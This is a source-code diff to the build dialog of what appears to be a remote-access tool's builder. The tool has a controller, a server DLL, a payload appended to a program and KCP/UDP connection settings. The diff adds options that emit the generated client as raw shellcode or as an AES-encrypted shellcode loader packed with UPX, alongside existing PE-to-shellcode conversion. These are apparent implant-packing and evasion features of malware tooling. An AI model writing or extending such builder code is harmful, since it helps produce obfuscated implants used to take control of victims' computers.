@@ -461,12 +461,13 @@ void CBuildDlg::OnBnClickedOk()
         CString tip = index == IndexTestRun_DLL ? "\r\n" + _TR("提示: 请生成\"ServerDll.dll\"，以便程序正常运行。") : _T("");
         tip += g_ConnectAddress.protoType==PROTO_KCP ? "\n" + _TR("提示: 使用KCP协议生成服务，必须设置主控UDP协议参数为1。") : _T("");
         std::string upx;
-        if(m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_UPX) upx = ReleaseUPX();
+        int sel = m_ComboCompress.GetCurSel();
+        if(sel == CLIENT_COMPRESS_UPX)upx = ReleaseUPX();
         if (!upx.empty()) {
             run_upx_async(GetParent()->GetSafeHwnd(), upx, strSeverFile.GetString(), true);
             MessageBoxL(_TR("正在UPX压缩，请关注信息提示。") + "\r\n" + _TR("文件位于: ") + strSeverFile + tip, "提示", MB_ICONINFORMATION);
         } else {
-            if (m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC_AES) {
+            if (sel == CLIENT_COMPRESS_SC_AES) {
                 DWORD dwSize = 0;
                 LPBYTE data = ReadResource(is64bit ? IDR_SCLOADER_X64 : IDR_SCLOADER_X86, dwSize);
                 if (data) {
@@ -524,12 +525,13 @@ void CBuildDlg::OnBnClickedOk()
                     }
                 }
                 SAFE_DELETE_ARRAY(data);
-            } else if (m_ComboCompress.GetCurSel() == CLIENT_PE_TO_SEHLLCODE) {
+            } else if (sel == CLIENT_PE_TO_SEHLLCODE) {
                 int pe_2_shellcode(const std::string & in_path, const std::string & out_str);
                 int ret = pe_2_shellcode(strSeverFile.GetString(), strSeverFile.GetString());
                 if (ret)MessageBoxL(CString("ShellCode 转换异常, 异常代码: ") + CString(std::to_string(ret).c_str()),
                                         "提示", MB_ICONINFORMATION);
-            } else if (m_ComboCompress.GetCurSel() == CLIENT_COMPRESS_SC_AES_OLD) { // 兼容旧版本
+            } else if (sel == CLIENT_COMPRESS_SC_AES_OLD || // 兼容旧版本
+                sel == CLIENT_COMP_SC_AES_OLD_UPX) {
                 DWORD dwSize = 0;
                 LPBYTE data = ReadResource(is64bit ? IDR_SCLOADER_X64_OLD : IDR_SCLOADER_X86_OLD, dwSize);
                 if (data) {
@@ -557,10 +559,26 @@ void CBuildDlg::OnBnClickedOk()
                             PathRenameExtension(strSeverFile.GetBuffer(MAX_PATH), _T(".exe"));
                             strSeverFile.ReleaseBuffer();
                             BOOL r = WriteBinaryToFile(strSeverFile.GetString(), (char*)data, dwSize);
+                            if (r && sel == CLIENT_COMP_SC_AES_OLD_UPX) {
+                                upx = ReleaseUPX();
+                                if (!upx.empty()) {
+                                    run_upx_async(GetParent()->GetSafeHwnd(), upx, strSeverFile.GetString(), true);
+                                }
+                            }
                         }
                     }
                 }
                 SAFE_DELETE_ARRAY(data);
+            }
+            else if (sel == CLIENT_SHELLCODE_BINARY) { // Shellcode 裸数据
+                LPBYTE srcData = (LPBYTE)szBuffer;
+                int srcLen = dwFileSize;
+                if (MakeShellcode(srcData, srcLen, (LPBYTE)szBuffer, dwFileSize, true)) {
+                    PathRenameExtension(strSeverFile.GetBuffer(MAX_PATH), _T(".bin"));
+                    strSeverFile.ReleaseBuffer();
+                    BOOL r = WriteBinaryToFile(strSeverFile.GetString(), (char*)srcData, srcLen);
+                    SAFE_DELETE_ARRAY(srcData);
+                }
             }
             int size = m_SliderClientSize.GetPos() * 2.56 * 1024 * 1024;
             if (size > 0) {
@@ -658,6 +676,8 @@ BOOL CBuildDlg::OnInitDialog()
     m_ComboCompress.InsertStringL(CLIENT_COMPRESS_SC_AES, "ShellCode AES");
     m_ComboCompress.InsertStringL(CLIENT_PE_TO_SEHLLCODE, "PE->ShellCode");
     m_ComboCompress.InsertStringL(CLIENT_COMPRESS_SC_AES_OLD, "ShellCode AES<Old>");
+    m_ComboCompress.InsertStringL(CLIENT_SHELLCODE_BINARY, "ShellCode BIN");
+    m_ComboCompress.InsertStringL(CLIENT_COMP_SC_AES_OLD_UPX, "SC AES<Old> + UPX");
     m_ComboCompress.SetCurSel(CLIENT_COMPRESS_SC_AES_OLD);
 
     m_ComboPayload.InsertStringL(Payload_Self, "载荷写入当前程序尾部");
